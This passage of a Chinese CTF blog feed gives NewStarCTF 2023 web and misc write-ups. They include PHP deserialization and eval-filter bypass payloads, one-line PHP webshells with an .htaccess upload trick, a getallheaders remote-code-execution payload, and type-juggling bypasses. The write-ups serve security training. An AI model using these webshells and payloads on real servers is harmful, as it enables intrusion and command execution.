class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>拿到<code>O%3A4%3A%22evil%22%3A1%3A%7Bs%3A9%3A%22%00evil%00cmd%22%3Bs%3A4%3A%22ls+%2F%22%3B%7D</code></p><p>直接打，发现flag路径：<code>/th1s_1s_fffflllll4444aaaggggg</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Maybe you need learn some knowledge about deserialize?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ca&#x27;&#x27;t /th1s_1s_fffflllll4444aaaggggg&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;cmd)) &#123;<br>            @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> evil;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用单引号绕过过滤，拿到<code>O%3A4%3A%22evil%22%3A1%3A%7Bs%3A9%3A%22%00evil%00cmd%22%3Bs%3A36%3A%22ca%27%27t+%2Fth1s_1s_fffflllll4444aaaggggg%22%3B%7D</code></p><p>得到flag：<code>flag&#123;f1e483d0-09a1-4376-b00b-60b3ea9422df&#125;</code></p><h2 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h2><p>上传php，发现有黑名单。</p><p>直接上传.htaccess</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">AddType application/x-httpd-php .jpg<br></code></pre></td></tr></table></figure><p>将jpg解析为php</p><p>上传1.jpg，发现含有<code>&lt;?</code>的文件被过滤，使用JavaScript标签绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$GET</span>[<span class="hljs-number">0</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>可以正常解析，剩下无脑直接找flag即可。</p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h2><p>打开容器发现<code>Welcome To NewstarCTF 2023,Nothing here,or you wanna to find some leaked information?</code></p><p>信息泄露，猜测是git泄露，使用GitHack工具</p><p>得到bo0g1pop.php，内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析逻辑，是无参数RCE，从start.sh可以看到flag在<code>/flag</code>中。</p><p>首先需要构造出<code>/flag</code>，使用<code>getallheaders</code>函数得到所有http Header</p><p>发现User-Agent在第二个，可以使用<code>next(getallheaders())</code>得到值。</p><p>改UA为&#x2F;flag，得到<code>/flag</code>字符串，接着使用<code>show_source</code>函数得到flag内容。</p><p>完整payload：<code>/bo0g1pop.php?star=show_source(next(getallheaders()));</code></p><p>得到flag：<code>flag&#123;34b4ffdf-5637-46ee-a734-30e031d0b73f&#125;</code></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>贴一个官方wp：<a href="https://shimo.im/docs/Dy5ekHJhKo0ap5v3/">https://shimo.im/docs/Dy5ekHJhKo0ap5v3/</a></p><p>其他方向没怎么研究，太忙了，只抽出来一个小时写了个Web</p>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2023-WEEK1 WriteUp</title>
    <link href="/2023/09/26/2023newstarctfWeek1/"/>
    <url>/2023/09/26/2023newstarctfWeek1/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>好久没碰ctf了，感觉手有点生，正好最近newstar新生赛，过来凑个热闹。</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>解题 7&#x2F;7</p><h3 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h3><p>介绍里面写了“粗心的网站管理员总会泄漏一些敏感信息在Web根目录下”，一眼信息泄露</p><p>打开容器，出现<code>粗心的管理员泄漏了一些敏感信息，请你找出他泄漏的两个敏感信息！</code>，&#x2F;robots.txt一试直接爆出flag的前半段，&#x2F;<a href="http://www.zip直接把源码泄露了./">www.zip直接把源码泄露了。</a></p><p>拿到flag：<code>flag&#123;r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous&#125;</code></p><h3 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h3><p>一眼文件上传，写一个php马试一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>发现文件后缀有白名单，但是验证是在前端，直接burp抓包改一下文件名就能绕</p><h3 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h3><p>打开容器，发现要求请使用 GET方式 来给 ctf 参数传入任意值来通过这关</p><p>加个参数试一下<code>http://node4.buuoj.cn:25055/?ctf=1</code></p><p>发现<code>很棒，如果我还想让你以POST方式来给我传递 secret 参数你又该如何处理呢？ 如果你传入的参数值并不是我想要的secret，我也不会放你过关的 或许你可以找一找我把secret藏在了哪里</code></p><p>ctrl+U看下源码，发现注释<code>&lt;!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) --&gt;</code></p><p>base64解码一下，得到secret是n3wst4rCTF2023g00000d</p><p>HackBar插件传一下POST参数</p><p>接下来发现<code>很强，现在我需要验证你的 power 是否是 ctfer ，只有ctfer可以通过这关</code></p><p>Cookie改一下power改为ctfer</p><p>发现<code>你已经完成了本题过半的关卡，现在请使用 NewStarCTF2023浏览器 来通过这关！</code></p><p>把User-Agent改为NewStarCTF2023</p><p>发现<code>希望你是从 newstarctf.com 访问到这个关卡的</code></p><p>加个Referer: <code>newstarctf.com</code> </p><p>最后发现<code>最后一关了！只有 本地用户 可以通过这一关</code></p><p>加一个Header：<code>X-Real-IP: 127.0.0.1</code>，本来以为这道题是要加X-Forwarded-For，结果加X-Forwarded-For发现好像不太行</p><p>拿到flag：<code>flag&#123;221fb558-9c0a-4b07-bac6-3af03cf7393e&#125;</code></p><h3 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h3><p>这道题有点奇怪，看到flask以为是SSTI，结果打开容器随便传个<code>number1=&#123;&#123;&#125;&#125;</code>，发现DEBUG模式没关，结果flag直接写到源代码里直接能看见，直接拿到flag：<code>flag&#123;Y0u_@re_3enset1ve_4bout_deb8g&#125;</code></p><h3 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h3><p>上来容器直接给出代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 1=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$flag1</span> = True;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 1&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 2=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$flag2</span> = True;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 2&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag2</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 3=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>],<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>)) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$flag3</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 3&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag3</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 4=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>] &gt; <span class="hljs-number">2023</span>)&#123;<br>            <span class="hljs-variable">$flag4</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 4&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag4</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 5=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$var</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag5</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>先看level1，要保证<code>$_GET[&#39;key1&#39;] !== $_GET[&#39;key2&#39;] &amp;&amp; md5($_GET[&#39;key1&#39;]) == md5($_GET[&#39;key2&#39;])</code>为 True，发现md5直接的判断是&#x3D;&#x3D;而不是&#x3D;&#x3D;&#x3D;，直接0e碰撞即可，随便找两个<code>240610708</code>和<code>QLTHNDT</code>就行。</p><p>再看level2，保证<code>md5($_POST[&#39;key3&#39;]) === sha1($_POST[&#39;key3&#39;]</code>为 True，中间是&#x3D;&#x3D;&#x3D;，没办法再用level1的0e碰撞了，这里一个小技巧直接POST传<code>key3[]=</code>即可，这里key3直接被识别成数组了，导致两个函数都返回false。</p><p>接下来level3，保证<code>strcmp($_GET[&#39;key4&#39;],file_get_contents(&quot;/flag&quot;)) == 0</code>为 True，继续用<code>key4[]=</code>，用数组的方式让其返回false</p><p>然后level4，保证<code>!is_numeric($_GET[&#39;key5&#39;]) &amp;&amp; $_GET[&#39;key5&#39;] &gt; 2023</code>为 True，传<code>key5=2024a</code>，当它与2023比较时就会比它大，而且还识别不出它是数字。</p><p>最后level5，要保证它不能全是字母和数字，还要保证flag5变量是True，POST传<code>flag5=-</code>即可。</p><p>拿到flag：<code>flag&#123;35c5a11f-c06d-4178-9fb8-b4f97d3e9796&#125;</code></p><h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h3><p>打开容器，贴上代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)===<span class="hljs-string">&quot;c4d038&quot;</span>)&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>要保证password的md5前6位是<code>c4d038</code>，同时code中不能含有一些敏感的单词。</p><p>这里贴上我跑MD5的脚本，写的不好，但是勉强能跑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> threading<br><br><span class="hljs-comment"># 需要遍历的字符集</span><br>characters = string.digits + string.ascii_letters<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_combinations</span>(<span class="hljs-params">length</span>):<br>    <span class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> itertools.product(characters, repeat=length):<br>        <span class="hljs-keyword">yield</span> <span class="hljs-string">&#x27;&#x27;</span>.join(combo)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_md5</span>(<span class="hljs-params">string</span>):<br>    md5_hash = hashlib.md5()  <span class="hljs-comment"># 创建MD5对象</span><br>    md5_hash.update(string.encode())  <span class="hljs-comment"># 更新对象哈希值</span><br>    md5_digest = md5_hash.hexdigest()  <span class="hljs-comment"># 获取哈希值的十六进制表示</span><br>    <span class="hljs-keyword">return</span> md5_digest<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_md5_match</span>(<span class="hljs-params">prefix</span>):<br>    <span class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> generate_combinations(<span class="hljs-built_in">len</span>(prefix)):<br>        string = prefix + combo<br>        md5 = calculate_md5(string)<br>        <span class="hljs-keyword">if</span> md5[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-string">&#x27;c4d038&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;string&#125;</span>   MD5哈希值: <span class="hljs-subst">&#123;md5&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 测试计算MD5</span><br>input_string = <span class="hljs-string">&quot;0&quot;</span><br><br>threads = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):  <span class="hljs-comment"># 根据实际情况设置线程数量</span><br>    prefix = input_string * i<br>    thread = threading.Thread(target=find_md5_match, args=(prefix,))<br>    threads.append(thread)<br>    thread.start()<br><br><span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> threads:<br>    thread.join()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;input_string&#125;</span>dddMD5哈希值: <span class="hljs-subst">&#123;md5&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>随便跑出来一个<code>0000006sNj</code></p><p>接着直接传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">e[v.a.l=<span class="hljs-keyword">echo</span> `cat /f*`<br></code></pre></td></tr></table></figure><p>这里注意要用[代替_，这算是一个php特性。</p><h3 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h3><p>打开容器，看到一个登录注册页面，拿burp抓包，最开始以为是sql注入，但是注入发现提示不是注入。</p><p>随便注册一个账号admin1，登录后发现是一个静态的shell，javascript代码审计一下，发现</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;echo -en &#x27;\\nnewstar\\nnewstar2023&#x27; &gt;&gt; weak-passwd.txt &amp;&amp; \\\nexport PASSWORD=`shuf weak-passwd.txt | head -n 1` &amp;&amp; \\\nrm -rf weak-passwd.txt&quot;</span>),<span class="hljs-title function_">applyAutoComplete</span>(le),<span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">800</span>),term.<span class="hljs-title function_">writeln</span>(<span class="hljs-variable constant_">WELCOME_TEXT</span>),<span class="hljs-title function_">readInput</span>(),le.<span class="hljs-title function_">detach</span>(),<span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">200</span>),le.<span class="hljs-title function_">attach</span>(),le.<span class="hljs-title function_">pushInput</span>(<span class="hljs-string">&quot;chat&quot;</span>),le.<span class="hljs-title function_">confirm</span>(),<span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">200</span>),le.<span class="hljs-title function_">pushInput</span>(<span class="hljs-string">&quot;你会说中文吗？&quot;</span>)<br></code></pre></td></tr></table></figure><p>提示weak-passwd.txt弱口令，再加上注册时发现admin用户已经被注册，使用burp直接爆破密码。</p><img src="/2023/09/26/2023newstarctfWeek1/burp.png" class=""><p>发现admin弱口令是000000</p><p>登录，并拦截返回包，javascript审计，发现提示</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;echo Maybe you need BurpSuite.&quot;</span><br></code></pre></td></tr></table></figure><p>清除cookie重新登录，拦截passport的返回包，得到flag：<code>flag&#123;97222ac1-f6d3-49c1-b1e6-05778420cfe2&#125;</code></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>解题 5&#x2F;6</p><h3 id="CyberChef’s-Secret"><a href="#CyberChef’s-Secret" class="headerlink" title="CyberChef’s Secret"></a>CyberChef’s Secret</h3><p>签到题，打开后看到<code>M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA=</code>，进入cyberchef.org，一把梭，拿到flag：<code>flag&#123;Base_15_S0_Easy_^_^&#125;</code>。</p><h3 id="机密图片"><a href="#机密图片" class="headerlink" title="机密图片"></a>机密图片</h3><p>zsteg工具</p><p>执行<code>zsteg secret.png</code>得到</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">b1</span></span>,r,lsb,xy         .. text: <span class="hljs-string">&quot;:=z^rzwPQb&quot;</span><br><span class="hljs-function"><span class="hljs-title">b1</span></span>,g,lsb,xy         .. <span class="hljs-keyword">file</span>: OpenPGP Public Key<br><span class="hljs-function"><span class="hljs-title">b1</span></span>,b,lsb,xy         .. <span class="hljs-keyword">file</span>: OpenPGP Secret Key<br><span class="hljs-function"><span class="hljs-title">b1</span></span>,rgb,lsb,xy       .. text: <span class="hljs-string">&quot;flag&#123;W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece&#125;&quot;</span><br><span class="hljs-function"><span class="hljs-title">b3</span></span>,b,lsb,xy         .. <span class="hljs-keyword">file</span>: very old <span class="hljs-number">16</span>-bit-int big-endian archive<br><span class="hljs-function"><span class="hljs-title">b4</span></span>,bgr,msb,xy       .. <span class="hljs-keyword">file</span>: MPEG ADTS, layer I, v2, <span class="hljs-number">112</span> kbps, <span class="hljs-number">24</span> kHz, JntStereo<br></code></pre></td></tr></table></figure><p>拿到flag：<code>flag&#123;W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece&#125;</code></p><h3 id="流量！鲨鱼！"><a href="#流量！鲨鱼！" class="headerlink" title="流量！鲨鱼！"></a>流量！鲨鱼！</h3><p>wireshark打开发现流量<code>1.php%3fcmd=ls%20-al%20</code>内容为</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs tap">total 80<br>drwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 19 </span>06:17 .<br>drwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 19 </span>06:17 ..<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root   <span class="hljs-number"> 0 </span>Aug<span class="hljs-number"> 19 </span>06:08 .dockerenv<br>-rw-r--r--  <span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 39 </span>Aug<span class="hljs-number"> 19 </span>06:17 .ffffllllllll11111144444GGGGGG<br>drwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 21 </span><span class="hljs-number"> 2021 </span>bin<br>drwxr-xr-x  <span class="hljs-number"> 2 </span>root root<span 